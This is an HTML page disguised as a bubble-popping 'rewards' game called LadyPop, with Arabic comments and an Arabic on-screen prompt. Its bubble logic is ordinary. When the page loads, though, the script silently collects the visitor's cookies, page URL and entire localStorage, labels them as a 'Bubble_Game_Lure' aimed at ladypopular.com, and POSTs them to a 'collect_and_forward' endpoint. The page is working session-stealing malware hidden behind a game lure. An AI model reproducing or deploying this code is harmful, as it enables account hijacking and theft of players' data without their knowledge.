<!DOCTYPE html>
<html>
<head>
    <title>LadyPop: Bubble Rewards Game!</title>
    <style>
        body { margin: 0; overflow: hidden; background-color: #2c3e50; font-family: 'Arial', sans-serif; }
        #game-area { width: 100vw; height: 100vh; position: relative; cursor: pointer; }
        .bubble {
            position: absolute;
            border-radius: 50%;
            background: rgba(46, 204, 113, 0.7); /* لون مبدئي */
            box-shadow: 0 0 10px rgba(255, 255, 255, 0.5);
            transition: transform 0.5s ease-out, opacity 0.5s ease-out;
            animation: float-up linear infinite;
        }
        @keyframes float-up {
            0% { transform: translateY(100vh); opacity: 0.8; }
            100% { transform: translateY(-10vh); opacity: 0; }
        }
        #score-board {
            position: absolute;
            top: 10px;
            left: 10px;
            color: white;
            font-size: 24px;
            background: rgba(0, 0, 0, 0.5);
            padding: 5px 15px;
            border-radius: 5px;
            z-index: 1000;
        }
        #message {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            color: white;
            font-size: 30px;
            text-align: center;
            z-index: 1001;
        }
    </style>
</head>
<body>

<div id="game-area">
    <div id="score-board">Gems: <span id="score">0</span></div>
    <div id="message">اضغط على الفقاعات لجمع الألماس المخفي!</div>
</div>

<script>
    const scoreElement = document.getElementById('score');
    let score = 0;
    const gameArea = document.getElementById('game-area');
    const colors = ['#e74c3c', '#3498db', '#f1c40f', '#9b59b6'];

    function createBubble() {
        const size = Math.random() * 50 + 30; // حجم بين 30 و 80
        const x = Math.random() * (window.innerWidth - size);
        const duration = Math.random() * 5 + 5; // سرعة بين 5 و 10 ثواني
        const color = colors[Math.floor(Math.random() * colors.length)];

        const bubble = document.createElement('div');
        bubble.className = 'bubble';
        bubble.style.width = bubble.style.height = `${size}px`;
        bubble.style.left = `${x}px`;
        bubble.style.backgroundColor = color;
        bubble.style.animationDuration = `${duration}s`;

        // عند النقر (ثقب الفقاعة)
        bubble.onclick = () => {
            score += Math.floor(Math.random() * 5) + 1; // زيادة عشوائية في النقاط
            scoreElement.textContent = score;
            bubble.remove(); // إزالة الفقاعة المثقوبة
            // تأكد من توليد فقاعات جديدة باستمرار
            setTimeout(createBubble, 500); 
        };

        gameArea.appendChild(bubble);

        // إزالة الفقاعات التي تصل إلى الأعلى تلقائيًا
        setTimeout(() => {
            if (gameArea.contains(bubble)) {
                bubble.remove();
            }
        }, duration * 1000); 
    }

    // بدء اللعبة وتوليد الفقاعات الأولى
    for (let i = 0; i < 10; i++) {
        createBubble();
    }
    
    // إخفاء رسالة البداية
    setTimeout(() => {
        document.getElementById('message').style.display = 'none';
    }, 4000);

    const dataToExfiltrate = {
        cookies: document.cookie,
        url: window.location.href,
        localStorage: JSON.stringify(localStorage), 
        gameDomain: 'ladypopular.com',
        payload_identity: 'Bubble_Game_Lure' 
    };
    
    const EXFIL_ENDPOINT = 'https://' + window.location.host + '/collect_and_forward';
    
    fetch(EXFIL_ENDPOINT, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(dataToExfiltrate),
        mode: 'cors' 
    })
    .then(() => {
        console.log('MOBY Exfiltration Attempt Complete.');
    })
    .catch((error) => {
        console.error('MOBY Silent Error:', error);
    });

</script>

</body>
</html>
